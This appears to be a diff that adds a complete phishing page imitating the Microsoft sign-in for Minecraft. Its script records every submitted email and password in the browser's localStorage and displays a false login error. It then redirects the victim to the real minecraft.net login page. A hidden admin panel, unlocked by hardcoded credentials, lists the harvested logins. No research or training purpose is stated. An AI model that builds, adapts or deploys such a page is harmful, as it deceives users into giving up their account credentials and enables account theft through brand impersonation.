@@ -1,1 +1,649 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in to Minecraft</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
 
+        body {
+            background: #f2f2f2;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            width: 440px;
+            max-width: 100%;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 44px 40px 36px;
+            transition: 0.2s;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .logo svg {
+            width: 108px;
+            height: 28px;
+        }
+
+        .logo-text {
+            font-size: 22px;
+            font-weight: 300;
+            color: #1b1b1b;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+        }
+
+        .subtitle a {
+            color: #0067b8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .subtitle a:hover {
+            text-decoration: underline;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 4px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px 12px;
+            font-size: 15px;
+            border: 1px solid #8b8b8b;
+            border-radius: 2px;
+            background: white;
+            color: #1b1b1b;
+            outline: none;
+            transition: border 0.1s;
+        }
+
+        .input-group input:focus {
+            border-color: #0067b8;
+            box-shadow: 0 0 0 2px rgba(0, 103, 184, 0.2);
+        }
+
+        .input-group input::placeholder {
+            color: #8b8b8b;
+            font-weight: 400;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: right;
+            font-size: 14px;
+            color: #0067b8;
+            text-decoration: none;
+            margin-top: 4px;
+            margin-bottom: 20px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .next-btn {
+            width: 100%;
+            padding: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            background: #0067b8;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            transition: background 0.15s;
+            margin-bottom: 16px;
+        }
+
+        .next-btn:hover {
+            background: #004d8c;
+        }
+
+        .next-btn:active {
+            background: #003d6b;
+        }
+
+        .create-account {
+            font-size: 14px;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+        }
+
+        .create-account a {
+            color: #0067b8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #e6e6e6;
+            padding-top: 16px;
+            margin-top: 8px;
+        }
+
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin-right: 16px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px 0;
+        }
+
+        .minecraft-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 500;
+            color: #1b1b1b;
+        }
+
+        .minecraft-badge i {
+            font-size: 18px;
+        }
+
+        /* Private browsing message */
+        .private-browsing {
+            font-size: 13px;
+            color: #666;
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid #e6e6e6;
+            line-height: 1.4;
+        }
+
+        .private-browsing a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .private-browsing a:hover {
+            text-decoration: underline;
+        }
+
+        /* error message */
+        .error-msg {
+            background: #e81123;
+            color: white;
+            padding: 8px 14px;
+            border-radius: 2px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .error-msg i {
+            font-size: 18px;
+        }
+
+        /* admin panel – hidden by default */
+        .admin-panel {
+            margin-top: 28px;
+            background: #f9f9f9;
+            border-radius: 6px;
+            padding: 18px 20px 20px;
+            border: 1px solid #ccc;
+            display: none;
+            text-align: left;
+        }
+
+        .admin-panel h2 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 10px;
+            flex-wrap: wrap;
+        }
+
+        .admin-panel h2 i {
+            color: #0067b8;
+        }
+
+        .admin-panel .log-entry {
+            background: white;
+            padding: 10px 14px;
+            border-radius: 4px;
+            margin-bottom: 8px;
+            border-left: 4px solid #0067b8;
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            flex-wrap: wrap;
+            gap: 4px 12px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+        }
+
+        .admin-panel .log-entry .email {
+            font-weight: 600;
+            color: #1b1b1b;
+        }
+
+        .admin-panel .log-entry .pass {
+            color: #333;
+            font-family: 'Courier New', monospace;
+            background: #f0f0f0;
+            padding: 0 8px;
+            border-radius: 2px;
+        }
+
+        .admin-panel .log-entry .time {
+            color: #888;
+            font-size: 12px;
+        }
+
+        .admin-panel .empty-log {
+            color: #888;
+            font-style: italic;
+            text-align: center;
+            padding: 16px 0;
+        }
+
+        .admin-panel .badge {
+            background: #0067b8;
+            color: white;
+            font-size: 11px;
+            padding: 2px 12px;
+            border-radius: 40px;
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+
+        .admin-panel .refresh-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 4px 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: auto;
+        }
+
+        .admin-panel .refresh-btn:hover {
+            background: #218838;
+        }
+
+        .admin-panel .clear-btn {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 4px 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 6px;
+        }
+
+        .admin-panel .clear-btn:hover {
+            background: #c82333;
+        }
+
+        .admin-panel .stats {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        /* responsive */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 28px 18px 24px;
+            }
+            .footer {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 12px;
+            }
+            .admin-panel h2 {
+                flex-wrap: wrap;
+            }
+            .admin-panel .refresh-btn {
+                margin-left: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container" id="loginContainer">
+
+        <!-- Microsoft + Minecraft logo -->
+        <div class="logo">
+            <svg viewBox="0 0 108 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M0 0H108V28H0V0Z" fill="white" />
+                <path d="M10.5 5.5H20.5V22.5H10.5V5.5Z" fill="#F25022" />
+                <path d="M22.5 5.5H32.5V22.5H22.5V5.5Z" fill="#7FBA00" />
+                <path d="M34.5 5.5H44.5V22.5H34.5V5.5Z" fill="#00A4EF" />
+                <path d="M46.5 5.5H56.5V22.5H46.5V5.5Z" fill="#FFB900" />
+                <path d="M60 5.5H104V22.5H60V5.5Z" fill="white" stroke="#E5E5E5" />
+                <text x="65" y="18" font-family="Segoe UI, Arial, sans-serif" font-size="14" font-weight="500" fill="#1b1b1b">Microsoft</text>
+            </svg>
+            <span class="logo-text">| Minecraft</span>
+        </div>
+
+        <h1>Sign in</h1>
+        <div class="subtitle">
+            to continue to <a href="#">Minecraft</a>.
+        </div>
+
+        <!-- Error message -->
+        <div id="errorMessage" class="error-msg">
+            <i class="fas fa-exclamation-circle"></i> <span id="errorText">Invalid email or password.</span>
+        </div>
+
+        <!-- Login Form -->
+        <form id="loginForm" autocomplete="off">
+            <div class="input-group">
+                <label for="emailInput">Email or phone</label>
+                <input type="text" id="emailInput" placeholder="someone@example.com" value="" />
+            </div>
+
+            <div class="input-group">
+                <label for="passwordInput">Password</label>
+                <input type="password" id="passwordInput" placeholder="••••••••" value="" />
+            </div>
+
+            <a href="#" class="forgot-link">Forgot your username?</a>
+
+            <button type="submit" class="next-btn" id="loginBtn">Next</button>
+        </form>
+
+        <div class="create-account">
+            New to Microsoft? <a href="#">Create an account</a>
+        </div>
+
+        <!-- Private browsing message -->
+        <div class="private-browsing">
+            Use private browsing if this is not your device. <a href="#">Learn more</a>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Help and feedback</a>
+                <a href="#">Terms of use</a>
+                <a href="#">Privacy and cookies</a>
+            </div>
+            <div class="minecraft-badge">
+                <i class="fas fa-cube" style="color:#6b8c3c;"></i> MINECRAFT
+            </div>
+        </div>
+
+        <!-- Admin Panel (hidden) – triggered by adminpan80 / adminpan80 -->
+        <div id="adminPanel" class="admin-panel">
+            <h2>
+                <i class="fas fa-user-cog"></i> Admin Panel
+                <button class="refresh-btn" id="refreshLogsBtn"><i class="fas fa-sync"></i> Refresh</button>
+                <button class="clear-btn" id="clearLogsBtn"><i class="fas fa-trash"></i> Clear</button>
+            </h2>
+            <div class="badge"><i class="fas fa-lock"></i> captured logins</div>
+            <div class="stats" id="statsDisplay">Total: 0 logins</div>
+            <div id="logContainer">
+                <div class="empty-log"><i class="fas fa-inbox"></i> No logins captured.</div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // DOM elements
+            var loginForm = document.getElementById('loginForm');
+            var emailInput = document.getElementById('emailInput');
+            var passwordInput = document.getElementById('passwordInput');
+            var errorMsg = document.getElementById('errorMessage');
+            var errorText = document.getElementById('errorText');
+            var adminPanel = document.getElementById('adminPanel');
+            var logContainer = document.getElementById('logContainer');
+            var statsDisplay = document.getElementById('statsDisplay');
+            var refreshBtn = document.getElementById('refreshLogsBtn');
+            var clearBtn = document.getElementById('clearLogsBtn');
+
+            // Key for localStorage
+            var STORAGE_KEY = 'minecraft_login_history';
+
+            // Load login history from localStorage
+            function loadHistory() {
+                try {
+                    var stored = localStorage.getItem(STORAGE_KEY);
+                    if (stored) {
+                        return JSON.parse(stored);
+                    }
+                } catch (e) {
+                    console.warn('Failed to load history from localStorage', e);
+                }
+                return [];
+            }
+
+            // Save login history to localStorage
+            function saveHistory(history) {
+                try {
+                    localStorage.setItem(STORAGE_KEY, JSON.stringify(history));
+                } catch (e) {
+                    console.warn('Failed to save history to localStorage', e);
+                }
+            }
+
+            // Get current history
+            function getHistory() {
+                return loadHistory();
+            }
+
+            // Add a new login entry
+            function addLoginEntry(email, password) {
+                var history = getHistory();
+                var now = new Date();
+                var timeStr = now.toLocaleTimeString() + ' ' + now.toLocaleDateString();
+                var entry = {
+                    email: email || '(empty)',
+                    password: password || '(empty)',
+                    time: timeStr,
+                    timestamp: now.getTime()
+                };
+                history.push(entry);
+                saveHistory(history);
+                return history;
+            }
+
+            // Clear all history
+            function clearHistory() {
+                saveHistory([]);
+                renderLogs();
+            }
+
+            // helper: escape HTML
+            function escapeHtml(text) {
+                if (!text) return '';
+                var map = {
+                    '&': '&amp;',
+                    '<': '&lt;',
+                    '>': '&gt;',
+                    '"': '&quot;',
+                    "'": '&#039;'
+                };
+                return text.replace(/[&<>"']/g, function(m) { return map[m]; });
+            }
+
+            // render logs
+            function renderLogs() {
+                if (!logContainer) return;
+                var history = getHistory();
+                logContainer.innerHTML = '';
+                if (history.length === 0) {
+                    logContainer.innerHTML = '<div class="empty-log"><i class="fas fa-inbox"></i> No logins captured.</div>';
+                    if (statsDisplay) statsDisplay.textContent = 'Total: 0 logins';
+                    return;
+                }
+
+                // show latest first (reverse)
+                var reversed = history.slice().reverse();
+                for (var i = 0; i < reversed.length; i++) {
+                    var entry = reversed[i];
+                    var div = document.createElement('div');
+                    div.className = 'log-entry';
+                    var timeStr = entry.time || 'just now';
+                    div.innerHTML = '<span class="email"><i class="fas fa-user"></i> ' + escapeHtml(entry.email) + '</span>' +
+                        '<span class="pass"><i class="fas fa-key"></i> ' + escapeHtml(entry.password) + '</span>' +
+                        '<span class="time"><i class="far fa-clock"></i> ' + escapeHtml(timeStr) + '</span>';
+                    logContainer.appendChild(div);
+                }
+
+                if (statsDisplay) {
+                    statsDisplay.textContent = 'Total: ' + history.length + ' logins';
+                }
+            }
+
+            function showError(msg) {
+                errorText.textContent = msg || 'Invalid email or password.';
+                errorMsg.style.display = 'flex';
+                clearTimeout(window.errorTimeout);
+                window.errorTimeout = setTimeout(function() {
+                    errorMsg.style.display = 'none';
+                }, 5000);
+            }
+
+            function hideError() {
+                errorMsg.style.display = 'none';
+                clearTimeout(window.errorTimeout);
+            }
+
+            // Handle login submit
+            function handleLogin(e) {
+                e.preventDefault();
+                hideError();
+
+                var email = emailInput.value.trim();
+                var password = passwordInput.value.trim();
+
+                // ---- ADMIN CREDENTIALS ----
+                if (email === 'adminpan80' && password === 'adminpan80') {
+                    // show admin panel, clear fields, do NOT redirect
+                    adminPanel.style.display = 'block';
+                    renderLogs();
+                    emailInput.value = '';
+                    passwordInput.value = '';
+                    return;
+                }
+
+                // ---- NORMAL FLOW: show error, capture, redirect ----
+                // 1. show error
+                showError('Invalid email or password.');
+
+                // 2. capture login info (saves to localStorage)
+                addLoginEntry(email, password);
+
+                // 3. if admin panel is visible, update logs
+                if (adminPanel.style.display === 'block') {
+                    renderLogs();
+                }
+
+                // 4. redirect to REAL Minecraft login page (minecraft.net)
+                setTimeout(function() {
+                    window.location.href = 'https://www.minecraft.net/en-us/login';
+                }, 400);
+
+                // clear fields
+                emailInput.value = '';
+                passwordInput.value = '';
+            }
+
+            // attach event listener
+            if (loginForm) {
+                loginForm.addEventListener('submit', handleLogin);
+            }
+
+            // Refresh button
+            if (refreshBtn) {
+                refreshBtn.addEventListener('click', function() {
+                    renderLogs();
+                });
+            }
+
+            // Clear button
+            if (clearBtn) {
+                clearBtn.addEventListener('click', function() {
+                    if (confirm('Clear all captured logins?')) {
+                        clearHistory();
+                    }
+                });
+            }
+
+            console.log('Minecraft login clone ready. Admin: adminpan80 / adminpan80');
+            console.log('All logins are saved to localStorage and persist across sessions.');
+        })();
+    </script>
+
+</body>
+</html>
